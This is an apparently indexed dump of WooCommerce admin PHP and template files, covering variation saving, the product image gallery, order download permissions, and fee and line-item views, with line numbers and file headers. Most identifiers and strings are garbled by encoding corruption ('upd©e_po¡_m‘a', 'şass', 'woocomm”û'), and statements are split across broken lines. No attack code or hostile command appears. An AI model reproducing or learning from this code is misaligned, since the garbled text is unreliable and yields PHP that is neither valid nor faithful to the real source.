$v¬ŸtiÚ_id
, '_tax_class' );

1453 iàĞ
$is_dowÆßdabË
 == 'yes' ) {

1454 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_dowÆßd_lim™', 
	`wc_ş—n
Ğ
$v¬ŸbË_dowÆßd_lim™
[ 
$i
 ] ) );

1455 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_dowÆßd_expœy', 
	`wc_ş—n
Ğ
$v¬ŸbË_dowÆßd_expœy
[ 
$i
 ] ) );

1457 
$fes
 = 
	`¬¿y
();

1458 
$fe_Çmes
 = 
	`is£t
Ğ
$_POST
['_wc_v¬ŸtiÚ_fe_Çmes'][ 
$v¬ŸtiÚ_id
 ] ) ? 
	`¬¿y_m­
Ğ'wc_ş—n', $_POST['_wc_v¬ŸtiÚ_fe_Çmes'][ $v¬ŸtiÚ_id ] ) : 
	`¬¿y
();

1459 
$fe_u¾s
 = 
	`is£t
Ğ
$_POST
['_wc_v¬ŸtiÚ_fe_u¾s'][ 
$v¬ŸtiÚ_id
 ] ) ? 
	`¬¿y_m­
Ğ'wc_ş—n', $_POST['_wc_v¬ŸtiÚ_fe_u¾s'][ $v¬ŸtiÚ_id ] ) : 
	`¬¿y
();

1460 
$fe_u¾_size
 = Ğ
$fe_u¾s
 );

1462  
$ii
 = 0; $i˜< 
$fe_u¾_size
; $ii ++ ) {

1463 iàĞ! 
	`em±y
Ğ
$fe_u¾s
[ 
$ii
 ] ) )

1464 
$fes
[ 
	`md5
Ğ
$fe_u¾s
[ 
$ii
 ] ) ] = 
	`¬¿y
(

1465 'Çme' => 
$fe_Çmes
[ 
$ii
 ],

1466 'fe' => 
$fe_u¾s
[ 
$ii
 ]

1471 
	`do_aùiÚ
Ğ'woocomm”û_´oûss_´oduù_fe_dowÆßd_·ths', 
$po¡_id
, 
$v¬ŸtiÚ_id
, 
$fes
 );

1473 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_dowÆßdabË_fes', 
$fes
 );

1475 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_download_limit', '' );

1476 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_download_expiry', '' );

1477 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '_downloadable_files', '' );

1481 
$v¬ŸbË_shpšg_şass
[ 
$i
 ] = ! 
	`em±y
( $variable_shipping_class[ $i ] ) ? () $variable_shipping_class[ $i ] : '';

1482 
	`wp_£t_objeù_‹rms
Ğ
$v¬ŸtiÚ_id
, 
$v¬ŸbË_shpšg_şass
[ 
$i
 ], 'product_shipping_class');

1485 iàĞ
$v¬ŸtiÚ_id
 ) {

1486 
$wpdb
->
	`qu”y
Ğ$wpdb->
	`´•¬e
Ğ"DELETE FROM {$wpdb->po¡m‘a} WHERE m‘a_key LIKE '©Œibu‹_%%' AND…o¡_id = %d;", 
$v¬ŸtiÚ_id
 ) );

1487 
	`wp_ÿche_d–‘e
Ğ
$v¬ŸtiÚ_id
, 'post_meta');

1491 
	`fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$©Œibu‹
 ) {

1493 iàĞ
$©Œibu‹
['is_variation'] ) {

1495 iàĞ
	`is£t
Ğ
$_POST
[ '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['Çme'] ) ][ 
$i
 ] ) )

1496 
$v®ue
 = 
	`§n™ize_t™Ë
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
[ '©Œibu‹_' . sª™ize_t™ËĞ
$©Œibu‹
['Çme'] ) ][ 
$i
 ] ) ) );

1498 
$v®ue
 = '';

1500 
	`upd©e_po¡_m‘a
Ğ
$v¬ŸtiÚ_id
, '©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['Çme'] ), 
$v®ue
 );

1505 
	`do_aùiÚ
Ğ'woocomm”û_§ve_´oduù_v¬ŸtiÚ', 
$v¬ŸtiÚ_id
, 
$i
 );

1510 
WC_Produù_V¬ŸbË
::
	`sync
Ğ
$po¡_id
 );

1513 
$deçuÉ_©Œibu‹s
 = 
	`¬¿y
();

1515 
	`fÜ—ch
 ( 
$©Œibu‹s
 
as
 
$©Œibu‹
 ) {

1516 iàĞ
$©Œibu‹
['is_variation'] ) {

1519 iàĞ
	`is£t
Ğ
$_POST
[ 'deçuÉ_©Œibu‹_' . 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['name'] ) ] ) )

1520 
$v®ue
 = 
	`§n™ize_t™Ë
Ğ
	`Œim
Ğ
	`¡r¦ashes
Ğ
$_POST
[ 'deçuÉ_©Œibu‹_' . sª™ize_t™ËĞ
$©Œibu‹
['name'] ) ] ) ) );

1522 
$v®ue
 = '';

1524 iàĞ
$v®ue
 )

1525 
$deçuÉ_©Œibu‹s
[ 
	`§n™ize_t™Ë
Ğ
$©Œibu‹
['Çme'] ) ] = 
$v®ue
;

1529 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_deçuÉ_©Œibu‹s', 
$deçuÉ_©Œibu‹s
 );

1530 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-product-images.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 şas 
	cWC_M‘a_Box_Produù_Images
 {

23 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

25 <
div
 
id
="product_images_container">

26 <
ul
 
şass
="product_images">

27 <?
php


28 iàĞ
	`m‘ad©a_exi¡s
Ğ'po¡', 
$po¡
->
ID
, '_product_image_gallery' ) ) {

29 
$´oduù_image_g®Ëry
 = 
	`g‘_po¡_m‘a
Ğ
$po¡
->
ID
, '_´oduù_image_g®Ëry', 
Œue
 );

32 
$©chm’t_ids
 = 
	`g‘_po¡s
Ğ'po¡_·»Á=' . 
$po¡
->
ID
 . '&numberposts=-1&post_type=attachment&orderby=menu_order&order=ASC&post_mime_type=image&fields=ids&meta_key=_woocommerce_exclude_image&meta_value=0' );

33 
$©chm’t_ids
 = 
	`¬¿y_diff
Ğ$©chm’t_ids, 
	`¬¿y
Ğ
	`g‘_po¡_thumbÇ_id
() ) );

34 
$´oduù_image_g®Ëry
 = 
	`im¶ode
Ğ',', 
$©chm’t_ids
 );

37 
$©chm’ts
 = 
	`¬¿y_f‹r
Ğ
	`ex¶ode
Ğ',', 
$´oduù_image_g®Ëry
 ) );

39 iàĞ
$©chm’ts
 )

40 
	`fÜ—ch
 ( 
$©chm’ts
 
as
 
$©chm’t_id
 ) {

41 
echo
 '<l˜şass="image" d©a-©chm’t_id="' . 
	`esc_©Œ
Ğ
$©chm’t_id
 ) . '">

42 ' . wp_g‘_©chm’t_imageĞ$©chm’t_id, '
thumbÇ
' ) . '

43 <
ul
 
şass
="actions">

44 <
li
><
a
 
h»f
="#" 
şass
="d–‘ts" 
d©a
-
t
="' . __Ğ'D–‘image', 'woocomm”û' ) . '">' . __Ğ'
D–‘e
', '
woocomm”û
' ) . '</a></li>

45 </
ul
>

46 </
li
>';

49 </
ul
>

51 <
šput
 
ty³
="hidd’" 
id
="´oduù_image_g®Ëry" 
Çme
="´oduù_image_g®Ëry" 
v®ue
="<?phpƒchoƒsc_attr( $product_image_gallery ); ?>" />

53 </
div
>

54 <
p
 
şass
="add_product_images hide-if-no-js">

55 <
a
 
h»f
="#" 
d©a
-
choo£
="<?ph°_eĞ'Add Image tØProduù G®Ëry', 'woocomm”û' ); ?>" d©a-
upd©e
="<?ph°_eĞ'AddØg®Ëry', 'woocomm”û' ); ?>" d©a-
d–‘e
="<?ph°_eĞ'D–‘image', 'woocomm”û' ); ?>" d©a-
‹xt
="<?ph°_eĞ'D–‘e', 'woocomm”û' ); ?>"><?
php
 
	`_e
( 'Add…roduct gallery images', 'woocommerce' ); ?></a>

56 </
p
>

57 <?
php


63 
public
 
funùiÚ
 
	$§ve
Ğ
$po¡_id
, 
$po¡
 ) {

64 
$©chm’t_ids
 = 
	`¬¿y_f‹r
Ğ
	`ex¶ode
Ğ',', 
	`wc_ş—n
Ğ
$_POST
['product_image_gallery'] ) ) );

66 
	`upd©e_po¡_m‘a
Ğ
$po¡_id
, '_´oduù_image_g®Ëry', 
	`im¶ode
Ğ',', 
$©chm’t_ids
 ) );

67 
	}
}

	@includes/admin/post-types/meta-boxes/class-wc-meta-box-product-short-description.php

1 <?
php


13 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

18 şas 
	cWC_M‘a_Box_Produù_ShÜt_DesütiÚ
 {

23 
public
 
funùiÚ
 
	$ouut
Ğ
$po¡
 ) {

24 
$£‰šgs
 = 
	`¬¿y
(

26 'quickgs' => 
	`¬¿y
( 'buttons' => 'em,strong,link' ),

27 'tšymû' => 
	`¬¿y
(

34 
	`wp_ed™Ü
Ğ
	`html¥ecŸlch¬s_decode
Ğ
$po¡
->
po¡_exû½t
 ), 'exû½t', 
	`­¶y_f‹rs
Ğ'woocomm”û_´oduù_shÜt_desütiÚ_ed™Ü_£‰šgs', 
$£‰šgs
 ) );

37 
	}
}

	@includes/admin/post-types/meta-boxes/views/html-order-download-permission.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
div
 
	gşass
="wc-metabox closed">

5 <
h3
 
şass
="fixed">

6 <
bu‰Ú
 
ty³
="bu‰Ú" 
»l
="<?ph°echØabsštĞ$dowÆßd->´oduù_id ) . ',' .ƒsc_©ŒĞ$dowÆßd->dowÆßd_id ); ?>" 
şass
="»voke_acûs bu‰Ú"><?
php
 
_e
Ğ'RevokAcûss', 'woocomm”û' ); ?></
	gbu‰Ú
>

7 <
div
 
	gşass
="hªdËdiv" 
t™Ë
="<?php _e( 'Clickooggle', 'woocommerce' ); ?>"></div>

8 <
¡rÚg
>

9 <?
php
 
echo
 '#' . 
absšt
Ğ
$´oduù
->
id
 ) . ' &mdash; ' . 
­¶y_f‹rs
Ğ'woocomm”û_admš_dowÆßd_³rmissiÚs_t™Ë', $´oduù->
g‘_t™Ë
(), 
$dowÆßd
->
´oduù_id
, $dowÆßd->
Üd”_id
, $dowÆßd->
Üd”_key
, $dowÆßd->
dowÆßd_id
 ) . ' &mdash; ' . 
¥rštf
Ğ
__
Ğ'%s: %s', 'woocomm”û' ), 
$fe_couÁ
, 
wc_g‘_f’ame_äom_u¾
Ğ$´oduù->
g‘_fe_dowÆßd_·th
Ğ$dowÆßd->dowÆßd_id ) ) ) . ' &mdash; ' . s´štfĞ
_n
('DowÆßded % time', 'DowÆßded % times',‡bsštĞ$dowÆßd->
dowÆßd_couÁ
 ), 'woocommerce'),‡bsint( $download->download_count ) ); ?>

10 </
	g¡rÚg
>

11 </
	gh3
>

12 <
bË
 
	gûÎ·ddšg
="0" 
ûÎ¥acšg
="0" 
şass
="wc-metabox-content">

13 <
tbody
>

14 <
Œ
>

15 <
td
>

16 <
Ïb–
><?
php
 
_e
( 'Downloads Remaining', 'woocommerce' ); ?>:</label>

17 <
šput
 
ty³
="hidd’" 
Çme
="´oduù_id[<?ph°echØ$loİ; ?>]" 
v®ue
="<?phpƒcho‡bsint( $download->product_id ); ?>" />

18 <
šput
 
ty³
="hidd’" 
Çme
="dowÆßd_id[<?ph°echØ$loİ; ?>]" 
v®ue
="<?phpƒchoƒsc_attr( $download->download_id ); ?>" />

19 <
šput
 
ty³
="numb”" 
¡•
="1" 
mš
="0" 
şass
="shÜt" 
Çme
="dowÆßds_»maššg[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°echØesc_©ŒĞ$dowÆßd->dowÆßds_»maššg ); ?>" 
¶aûhŞd”
="<?php _e( 'Unlimited', 'woocommerce' ); ?>" />

20 </
td
>

21 <
td
>

22 <
Ïb–
><?
php
 
_e
( 'Access Expires', 'woocommerce' ); ?>:</label>

23 <
šput
 
ty³
="‹xt" 
şass
="shÜˆd©e-pick”" 
Çme
="acûss_expœes[<?ph°echØ$loİ; ?>]" 
v®ue
="<?ph°echØ$dowÆßd->acûss_expœe > 0 ? d©e_i18nĞ'Y-m-d', sŒtÙimeĞ$dowÆßd->acûss_expœe èè: ''; ?>" 
maxËngth
="10" 
¶aûhŞd”
="<?ph°_eĞ'Nev”', 'woocomm”û' ); ?>" 
·‰”n
="[0-9]{4}-(0[1-9]|1[012])-(0[1-9]|1[0-9]|2[0-9]|3[01])" />

24 </
td
>

25 </
Œ
>

26 </
tbody
>

27 </
bË
>

28 </
div
>

	@includes/admin/post-types/meta-boxes/views/html-order-fee.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
Œ
 
	gşass
="ã<?ph°iàĞ!ƒm±yĞ$şas èèechØ$şass; ?>" 
d©a
-
Üd”_™em_id
="<?phpƒcho $item_id; ?>">

5 <
td
 
şass
="check-cŞumn"><
šput
 
ty³
="checkbox" /></td>

7 <
td
 
şass
="thumb"></td>

9 <
td
 
şass
="name">

10 <
div
 
şass
="view">

11 <?
php


12 
echo
 ! 
em±y
Ğ
$™em
['Çme'] ) ? 
esc_html
Ğ$™em['Çme'] ) : 
__
( 'Fee', 'woocommerce' );

14 </
	gdiv
>

15 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

16 <
šput
 
ty³
="‹xt" 
¶aûhŞd”
="<?ph°_eĞ'F“ Name', 'woocomm”û' ); ?>" 
Çme
="Üd”_™em_Çme[<?ph°echØabsštĞ$™em_id ); ?>]" 
v®ue
="<?php if ( isset( $item['name'] ) )ƒchoƒsc_attr( $item['name'] ); ?>" />

17 <
šput
 
ty³
="hidd’" 
şass
="Üd”_™em_id" 
Çme
="Üd”_™em_id[]" 
v®ue
="<?phpƒchoƒsc_attr( $item_id ); ?>" />

18 </
div
>

19 </
td
>

21 <?
php
 iàĞ
g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

23 <
td
 
şass
="x_şass" 
width
="1%">

24 <
div
 
şass
="view">

25 <?
php


26 
$™em_v®ue
 = 
is£t
Ğ
$™em
['x_şass'] ) ? 
§n™ize_t™Ë
( $item['tax_class'] ) : '';

27 
echo
 
	g$™em_v®ue
 ? $™em_v®u: 
__
( 'Standard', 'woocommerce' );

29 </
	gdiv
>

30 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

31 <
£Ëù
 
şass
="x_şass" 
Çme
="Üd”_™em_x_şass[<?ph°echØabsštĞ$™em_id ); ?>]" 
t™Ë
="<?php _e( 'Tax class', 'woocommerce' ); ?>">

32 <?
php
 
$x_şass
 = 
is£t
Ğ
$™em
['x_şass'] ) ? 
§n™ize_t™Ë
( $item['tax_class'] ) : ''; ?>

33 <
İtiÚ
 
	gv®ue
="0" <?
php
 
£Ëùed
Ğ0, 
$x_şass
 ) ?>><?ph°
_e
Ğ'N/A', 'woocomm”û' ); ?></
	gİtiÚ
>

34 <
İtgroup
 
	gÏb–
="<?php _e( 'Taxable', 'woocommerce' ); ?>">

35 <?
php


36 
$x_şas£s
 = 
¬¿y_f‹r
Ğ
¬¿y_m­
Ğ'Œim', 
ex¶ode
Ğ"\n", 
g‘_İtiÚ
('woocommerce_tax_classes' ) ) ) );

38 
	g$şas£s_İtiÚs
 = 
¬¿y
();

39 
	g$şas£s_İtiÚs
[''] = 
__
( 'Standard', 'woocommerce' );

41 iàĞ
	g$x_şas£s
 )

42 
fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

43 
	g$şas£s_İtiÚs
[ 
§n™ize_t™Ë
Ğ
$şass
 ) ] = $class;

45 
fÜ—ch
 ( 
$şas£s_İtiÚs
 
as
 
$v®ue
 => 
$Çme
 )

46 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$v®ue
 ) . '" ' . 
£Ëùed
Ğ$v®ue, 
$x_şass
, 
çl£
 ) . '>'. 
esc_html
Ğ
$Çme
 ) . '</option>';

48 </
	gİtgroup
>

49 </
	g£Ëù
>

50 </
	gdiv
>

51 </
	gtd
>

53 <?
php
 
	g’dif
; ?>

55 <
td
 
	gşass
="quªt™y" 
width
="1%">1</td>

57 <
td
 
şass
="lše_co¡" 
width
="1%">

58 <
div
 
şass
="view">

59 <?
php
 iàĞ
is£t
Ğ
$™em
['lše_tÙ®'] ) ) 
echo
 
wc_´iû
Ğ
wc_round_x_tÙ®
( $item['line_total'] ) ); ?>

60 </
	gdiv
>

61 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

62 <
Ïb–
><?
php
 
_e
Ğ'TÙ®', 'woocomm”û' ); ?>: <
šput
 
ty³
="‹xt" 
Çme
="lše_tÙ®[<?ph°echØabsštĞ$™em_id ); ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?ph°iàĞis£tĞ$™em['lše_tÙ®'] ) )ƒchØesc_©ŒĞwc_fÜm©_loÿlized_´iûĞ$™em['lše_tÙ®'] ) ); ?>" 
şass
="line_total wc_input_price" /></label>

63 </
div
>

64 </
td
>

66 <?
php
 iàĞ
g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

68 <
td
 
şass
="lše_x" 
width
="1%">

69 <
div
 
şass
="view">

70 <?
php
 iàĞ
is£t
Ğ
$™em
['lše_x'] ) ) 
echo
 
wc_´iû
Ğ
wc_round_x_tÙ®
( $item['line_tax'] ) ); ?>

71 </
	gdiv
>

72 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

73 <
šput
 
ty³
="‹xt" 
Çme
="lše_x[<?ph°echØabsštĞ$™em_id ); ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?ph°iàĞis£tĞ$™em['lše_x'] ) )ƒchØesc_©ŒĞwc_fÜm©_loÿlized_´iûĞ$™em['lše_x'] ) ); ?>" 
şass
="line_tax wc_input_price" />

74 </
div
>

75 </
td
>

77 <?
php
 
’dif
; ?>

79 <
	gtd
>

80 <
a
 
	gşass
="ed™_Üd”_™em" 
h»f
="#"><
img
 
¤c
="<?ph°echØWC()->¶ugš_u¾(); ?>/as£ts/images/icÚs/ed™.²g" 
®t
="Ed™" 
width
="14" /></a>

81 </
td
>

83 </
Œ
>

	@includes/admin/post-types/meta-boxes/views/html-order-item.php

1 <?
php


2 iàĞ! 
defšed
Ğ'ABSPATH' ) ) 
	gex™
;

4 <
Œ
 
	gşass
="™em <?ph°iàĞ!ƒm±yĞ$şas èèechØ$şass; ?>" 
d©a
-
Üd”_™em_id
="<?phpƒcho $item_id; ?>">

5 <
td
 
şass
="check-cŞumn"><
šput
 
ty³
="checkbox" /></td>

6 <
td
 
şass
="thumb">

7 <?
php
 iàĞ
$_´oduù
 ) : ?>

8 <
a
 
h»f
="<?ph°echØesc_u¾Ğadmš_u¾Ğ'po¡.php?po¡=' .‡bsštĞ$_´oduù->id ) . '&aùiÚód™' ) ); ?>" 
şass
="ts" 
d©a
-
t
="<?php

10 
echo
 '<¡rÚg>' . 
__
Ğ'Produù ID:', 'woocomm”û' ) . '</¡rÚg> ' . 
absšt
Ğ
$™em
['product_id'] );

12 iàĞ
	g$™em
['variation_id'] )

13 
	gecho
 '<br/><¡rÚg>' . 
__
Ğ'V¬ŸtiÚ ID:', 'woocomm”û' ) . '</¡rÚg> ' . 
absšt
Ğ
$™em
['variation_id'] );

15 iàĞ
	g$_´oduù
 && $_´oduù->
	$g‘_sku
() )

16 
echo
 '<br/><¡rÚg>' . 
	`__
Ğ'Produù SKU:', 'woocomm”û' ).'</¡rÚg> ' . 
	`esc_html
Ğ
$_´oduù
->
	`g‘_sku
() );

18 iàĞ
$_´oduù
 && 
	`is£t
Ğ$_´oduù->
v¬ŸtiÚ_d©a
 ) )

19 
echo
 '<br/>' . 
	`wc_g‘_fÜm©‹d_v¬ŸtiÚ
Ğ
$_´oduù
->
v¬ŸtiÚ_d©a
, 
Œue
 );

22 <?
php
 : ?>

23 <?
php
 
echo
 
	`wc_¶aûhŞd”_img
( 'shop_thumbnail' ); ?>

24 <?
php
 
’dif
; ?>

25 </
td
>

26 <
td
 
şass
="name">

28 <?
php
 iàĞ
$_´oduù
 && $_´oduù->
	$g‘_sku
(èè
echo
 
	`esc_html
Ğ
$_´oduù
->
	`g‘_sku
() ) . ' &ndash; '; ?>

30 <?
php
 iàĞ
$_´oduù
 ) : ?>

31 <
a
 
rg‘
="_bÏnk" 
h»f
="<?phpƒchoƒsc_url(‡dmin_url( 'post.php?post='.‡bsint( $_product->id ) .'&action=edit' ) ); ?>">

32 <?
php
 
echo
 
	`esc_html
Ğ
$™em
['name'] ); ?>

33 </
a
>

34 <?
php
 : ?>

35 <?
php
 
echo
 
	`esc_html
Ğ
$™em
['name'] ); ?>

36 <?
php
 
’dif
; ?>

38 <
šput
 
ty³
="hidd’" 
şass
="Üd”_™em_id" 
Çme
="Üd”_™em_id[]" 
v®ue
="<?phpƒchoƒsc_attr( $item_id ); ?>" />

40 <
div
 
şass
="view">

41 <?
php


42 iàĞ
$m‘ad©a
 = 
$Üd”
->
	$has_m‘a
Ğ
$™em_id
 ) ) {

43 
echo
 '<table cellspacing="0" class="display_meta">';

44 
	`fÜ—ch
 ( 
$m‘ad©a
 
as
 
$m‘a
 ) {

47 iàĞ
	`š_¬¿y
Ğ
$m‘a
['m‘a_key'], 
	`­¶y_f‹rs
Ğ'woocomm”û_hidd’_Üd”_™emm‘a', 
	`¬¿y
(

61 iàĞ
	`is_£rŸlized
Ğ
$m‘a
['meta_value'] ) ) {

65 
echo
 '<Œ><th>' . 
	`wp_k£s_po¡
Ğ
	`u¾decode
Ğ
$m‘a
['m‘a_key'] ) ) . ':</th><td>' . wp_k£s_po¡Ğ
	`w·utİ
( urldecode( $meta['meta_value'] ) ) ) . '</td></tr>';

67 
echo
 '</table>';

68 
	}
}

70 </
	gdiv
>

71 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

72 <
bË
 
şass
="m‘a" 
ûÎ¥acšg
="0">

73 <
tfoÙ
>

74 <
Œ
>

75 <
td
 
cŞ¥ª
="4"><
bu‰Ú
 
şass
="add_Üd”_™em_m‘¨bu‰Ú"><?
php
 
_e
Ğ'Add&nb¥;m‘a', 'woocomm”û' ); ?></
	gbu‰Ú
></
	gtd
>

76 </
	gŒ
>

77 </
	gtfoÙ
>

78 <
tbody
 
	gşass
="meta_items">

79 <?
php


80 iàĞ
$m‘ad©a
 = 
$Üd”
->
	$has_m‘a
Ğ
$™em_id
 )) {

81 
	`fÜ—ch
 ( 
$m‘ad©a
 
as
 
$m‘a
 ) {

84 iàĞ
	`š_¬¿y
Ğ
$m‘a
['m‘a_key'], 
	`­¶y_f‹rs
Ğ'woocomm”û_hidd’_Üd”_™emm‘a', 
	`¬¿y
(

98 iàĞ
	`is_£rŸlized
Ğ
$m‘a
['meta_value'] ) ) {

102 
$m‘a
['m‘a_key'] = 
	`u¾decode
( $meta['meta_key'] );

103 
$m‘a
['m‘a_v®ue'] = 
	`esc_‹x»a
Ğ
	`u¾decode
( $meta['meta_value'] ) );

104 
$m‘a
['m‘a_id'] = 
	`absšt
( $meta['meta_id'] );

106 
echo
 '<Œ d©a-m‘a_id="' . 
	`esc_©Œ
Ğ
$m‘a
['meta_id'] ) . '">

107 <
td
>

108 <
šput
 
ty³
="‹xt" 
Çme
="m‘a_key[' . $m‘a['m‘a_id'] . ']" 
v®ue
="' .ƒsc_attr( $meta['meta_key'] ) . '" />

109 <
‹x»a
 
Çme
="m‘a_v®ue[' . $m‘a['m‘a_id'] . ']">' . $m‘a['
m‘a_v®ue
'] . '</textarea>

110 </
td
>

111 <
td
 
width
="1%"><
bu‰Ú
 
şass
="»move_Üd”_™em_m‘¨bu‰Ú">&
times
;</button></td>

112 </
Œ
>';

114 
	}
}

116 </
	gtbody
>

117 </
	gbË
>

118 </
	gdiv
>

119 </
	gtd
>

121 <?
php
 
do_aùiÚ
Ğ'woocomm”û_admš_Üd”_™em_v®ues', 
$_´oduù
, 
$™em
, 
absšt
Ğ
$™em_id
 ) ); ?>

123 <?
php
 iàĞ
g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) :

124 
$x_şas£s
 = 
¬¿y_f‹r
Ğ
¬¿y_m­
Ğ'Œim', 
ex¶ode
Ğ"\n", 
g‘_İtiÚ
('woocommerce_tax_classes' ) ) ) );

125 
	g$şas£s_İtiÚs
 = 
¬¿y
();

126 
	g$şas£s_İtiÚs
[''] = 
__
( 'Standard', 'woocommerce' );

128 iàĞ
	g$x_şas£s
 )

129 
fÜ—ch
 ( 
$x_şas£s
 
as
 
$şass
 )

130 
	g$şas£s_İtiÚs
[ 
§n™ize_t™Ë
Ğ
$şass
 ) ] = $class;

132 <
td
 
	gşass
="x_şass" 
width
="1%">

133 <
div
 
şass
="view">

134 <?
php


135 
$™em_v®ue
 = 
is£t
Ğ
$™em
['x_şass'] ) ? 
§n™ize_t™Ë
( $item['tax_class'] ) : '';

136 
echo
 
	g$şas£s_İtiÚs
[ 
$™em_v®ue
 ];

138 </
	gdiv
>

139 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

140 <
£Ëù
 
şass
="x_şass" 
Çme
="Üd”_™em_x_şass[<?ph°echØabsštĞ$™em_id ); ?>]" 
t™Ë
="<?php _e( 'Tax class', 'woocommerce' ); ?>">

141 <?
php


142 
$™em_v®ue
 = 
is£t
Ğ
$™em
['x_şass'] ) ? 
§n™ize_t™Ë
( $item['tax_class'] ) : '';

144 
fÜ—ch
 ( 
$şas£s_İtiÚs
 
as
 
$v®ue
 => 
$Çme
 )

145 
echo
 '<İtiÚ v®ue="' . 
esc_©Œ
Ğ
$v®ue
 ) . '" ' . 
£Ëùed
Ğ$v®ue, 
$™em_v®ue
, 
çl£
 ) . '>' . 
esc_html
Ğ
$Çme
 ) . '</option>';

147 </
	g£Ëù
>

148 </
	gdiv
>

149 </
	gtd
>

150 <?
php


151 
	g’dif
; ?>

153 <
td
 
	gşass
="quªt™y" 
width
="1%">

154 <
div
 
şass
="view">

155 <?
php
 iàĞ
is£t
Ğ
$™em
['qty'] ) ) 
echo
 
esc_html
( $item['qty'] ); ?>

156 </
	gdiv
>

157 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

158 <
šput
 
ty³
="numb”" 
¡•
="<?ph°echØ­¶y_f‹rsĞ'woocomm”û_quªt™y_šput_¡•', '1', $_´oduù ); ?>" 
mš
="0" 
autocom¶‘e
="off" 
Çme
="Üd”_™em_qty[<?ph°echØabsštĞ$™em_id ); ?>]" 
¶aûhŞd”
="0" 
v®ue
="<?ph°echØesc_©ŒĞ$™em['qty'] ); ?>" 
size
="4" 
şass
="quantity" />

159 </
div
>

160 </
td
>

162 <
td
 
şass
="lše_co¡" 
width
="1%">

163 <
div
 
şass
="view">

164 <?
php


165 iàĞ
is£t
Ğ
$™em
['line_total'] ) ) {

166 iàĞ
is£t
Ğ
$™em
['lše_subtÙ®'] ) && $™em['lše_subtÙ®'] !ğ$™em['lše_tÙ®'] ) 
echo
 '<d–>' . 
wc_´iû
( $item['line_subtotal'] ) . '</del> ';

168 
echo
 
wc_´iû
Ğ
$™em
['line_total'] );

171 </
	gdiv
>

172 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

173 <
¥ª
 
şass
="subtÙ®"><
Ïb–
><?
php
 
_e
Ğ'SubtÙ®', 'woocomm”û' ); ?>: <
a
 cÏss="ts" 
d©a
-
t
="<?ph°_eĞ'BefÜ´e-x discouÁs.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a> <
šput
 
ty³
="‹xt" 
Çme
="lše_subtÙ®[<?ph°echØabsštĞ$™em_id ); ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?php if ( isset( $item['line_subtotal'] ) )ƒchoƒsc_attr( wc_format_localized_price( $item['line_subtotal'] ) ); ?>" class="line_subtotal wc_input_price" /></label></span>

175 <
Ïb–
><?
php
 
_e
Ğ'TÙ®', 'woocomm”û' ); ?>: <
a
 
şass
="ts" 
d©a
-
t
="<?ph°_eĞ'Aá”…»-x discouÁs.', 'woocomm”û' ); ?>" 
h»f
="#">[?]</a> <
šput
 
ty³
="‹xt" 
Çme
="lše_tÙ®[<?ph°echØabsštĞ$™em_id ); ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
="<?php if ( isset( $item['line_total'] ) )ƒchoƒsc_attr( wc_format_localized_price( $item['line_total'] ) ); ?>" class="line_total wc_input_price" /></label>

176 </
div
>

177 </
td
>

179 <?
php
 iàĞ
g‘_İtiÚ
( 'woocommerce_calc_taxes' ) == 'yes' ) : ?>

181 <
td
 
şass
="lše_x" 
width
="1%">

182 <
div
 
şass
="view">

183 <?
php


184 iàĞ
is£t
Ğ
$™em
['line_tax'] ) ) {

185 iàĞ
is£t
Ğ
$™em
['lše_subtÙ®_x'] ) && $™em['lše_subtÙ®_x'] !ğ$™em['lše_x'] ) 
echo
 '<d–>' . 
wc_´iû
Ğ
wc_round_x_tÙ®
( $item['line_subtotal_tax'] ) ) . '</del> ';

187 
echo
 
wc_´iû
Ğ
wc_round_x_tÙ®
Ğ
$™em
['line_tax'] ) );

190 </
	gdiv
>

191 <
div
 
	gşass
="ed™" 
¡yË
="display:none">

192 <
¥ª
 
şass
="subtÙ®"><
šput
 
ty³
="‹xt" 
Çme
="lše_subtÙ®_x[<?ph°echØabsštĞ$™em_id ); ?>]" 
¶aûhŞd”
="<?ph°echØwc_fÜm©_loÿlized_´iûĞ0 ); ?>" 
v®ue
